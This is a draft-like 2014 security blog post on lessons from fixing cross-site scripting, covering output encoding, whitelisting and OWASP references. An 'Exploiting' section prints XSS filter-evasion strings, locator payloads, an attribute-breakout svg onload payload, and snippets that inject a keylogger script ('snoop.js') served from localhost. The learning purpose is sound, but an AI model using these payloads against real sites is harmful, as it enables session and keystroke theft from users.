---
layout: posts
title: "XSS Learnings"
description: "...."
keywords: "xss, cross site scripting, hacking, vulnerability, scripting"
date: 2014-10-09 23:13
categories: ['blog']
tags: ['security']
comments: true
meta: true
image:
  feature: covers/xss-security.jpg
  bg_style: 'background-position: left; background-size: contain; background-repeat: no-repeat; background-color: #000C14;'
quote:
    text: "When solving problems, dig at the roots instead of just hacking at the leaves."
    title: The College Blue Book
    author: Anthony J. D'Angelo
---


5 Learnings fixing XSS vulnerabilities

Most common security risks [OWASP Top 10][1]. Comes out every few years. People often complain howcome nothing new
comes up? Well, that's a problem too.

Whitehat Security Report shows that XSS is second most likely vulnerability to exist on a website at 53% just behind
Information Leakage (55%).

Information Leakage: Note: For those unfamiliar, Information Leakage is largely a catch-all term used to describe
                     a vulnerability where a website reveals sensitive data, such as technical details of the Web
                     application, environment, or user-specific data: sensitive data that's completely unnecessary
                     for a typical visitor, but may be used by an attacker to exploit the system, its hosting network,
                     or users. Common examples are a failure to scrub out HTML/ JavaScript comments containing
                     sensitive information (database passwords), improper application or server configurations, or
                     differences in page responses for valid versus invalid data.

Moving towards client site

// Not meant to be a lenghty write-up. But provides you with just enough context to know what you want to read up on
to solve the problem on hand

// XSS remains in the top 10 of vlunerbailities of all time. This list has not changed because ...

// Escaping a given char set is never enough

Tedious!

Automated tools can find some XSS problems automatically. However, each application builds output pages differently
and uses different browser side interpreters such as JavaScript, ActiveX, Flash, and Silverlight, making automated
detection difficult. Therefore, complete coverage requires a combination of manual code review and penetration testing,
in addition to automated approaches.

// 1 - Encoding
Input is left as is, and not santized. For a system that already exists in Production, think about the content
that has already been entered by users already.


* Different encoding types exist
* Attribute encoding, Content encoding

> But HTML entity encoding doesn't work if you're putting untrusted data inside a <script> tag anywhere, or an event
handler attribute like onmouseover, or inside CSS, or in a URL. So even if you use an HTML entity encoding method
everywhere, you are still most likely vulnerable to XSS. You MUST use the escape syntax for the part of the HTML
document you're putting untrusted data into. That's what the rules below are all about.
https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet

// 2 - Locator strings

// 3 - White list for absolute URL's
Positive or “whitelist” input validation is also recommended as it helps protect against XSS, but is not a complete
defense as many applications require special characters in their input. Such validation should, as much as possible,
validate the length, characters, format, and business rules on that data before accepting the input.


```
// Embedded tab
<IMG SRC="jav	ascript:alert('XSS');">

// Embedded Encoded tab
<IMG SRC="jav&#x09;ascript:alert('XSS');">

// Embedded carriage return to break up XSS
<IMG SRC="jav&#x0D;ascript:alert('XSS');">

```

// 4 - How to exploit a XSS vulnerable site
* Using <svg onload="..." />
* Using <img onload="..." />
* Passing in query string
* Using bit.ly to obfuscate a URL, or HTML encoding - its getting easy to get users to click on malciious links because of url shorterning
* Breaking the code

```
function escape(input) {
    return '<input type="text" value="' + input + '">';
}
```

```
"><svg onload="alert('hello world');">
```

// 5 Context




Character | HTML Encoding |
----------|:--------------|
& | `&amp;`
< | `&lt;`
> | `&gt;`
" | `&quote;`
' | `&#x27`
/ | `&#x2F;`



#### XSS Locator
~~~
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
~~~

#### XSS locator 2
~~~
'';!--"<XSS>=&{()}
~~~


{% highlight javascript %}
javascript:alert(‘hello’);
java&#010;script:alert(‘hello’);

// Embedded tab
jav	ascript:alert('hello');

// Embedded newline to break up XSS
java&#X0A;script:alert(‘hello’);
{% endhighlight %}

Ref: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet


# Exploiting
```
// Embed and execute client side script by using a script tag if it is allowed in XSS vulnerable web page
<script src="http://localhost:3000/snoop.js"></script>

// Encode special tags to HTML code to bypass sites with simple inadequate encoding of special tags only
&#060;script src="http://localhost:3000/snoop.js"&#062;&#060;/script&#062;
```

Some sites will prevent any `<script>` tags to be embedded or posted in their input fields. In that case, you
could try to embed and run xss-keylogger client side script as part of the `onload` attribute of an `svg` element.
```
<svg onload="http://localhost:3000/snoop.js" />


var d=document;var s=d.createElement('script');s.type='text/javascript';s.src='http://localhost:3000/snoop.js';var h=d.getElementsByTagName('head')[0];h.appendChild(s);

function loadScript(url, callback) {
        // Adding the script tag to the head as suggested before
        var head = document.getElementsByTagName('head')[0];
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = url;

        // Then bind the event to the callback function.
        // There are several events for cross browser compatibility.
        script.onreadystatechange = callback;
        script.onload = callback;

        // Fire the loading
        head.appendChild(script);
    }
```

## How to get it right
To improve my own knowledge on this domain, I thought I'd try and learn how to hack. It turned out to be a lot of
fun whilst at it.

Just wanted to move on from the `alert` messages that most XSS demonstrations show. Own complete application.
// Talk about XSS Keylogger and the learning
// For something more fletched out, [Browser Exploitation Framework (BeEF)][3]

Heaps of other methods. Suggest that you listen to [Application Security for RIAS][4] that demonstrats CSRF and even ClickJacking which I am
tempted to try on my site and see if it has any effects increasing the number of followers on my twitter - just kidding!

## References:
* https://github.com/cure53/xss-challenge-wiki/wiki/prompt.ml
* http://prompt.ml/0

[1]: https://www.owasp.org/index.php/Top_10_2013-Top_10
[2]: https://www.whitehatsec.com/assets/WPstatsReport_052013.pdf
[3]: http://beefproject.com
[4]: http://www.sencha.com/conference/session/application-security-for-rias
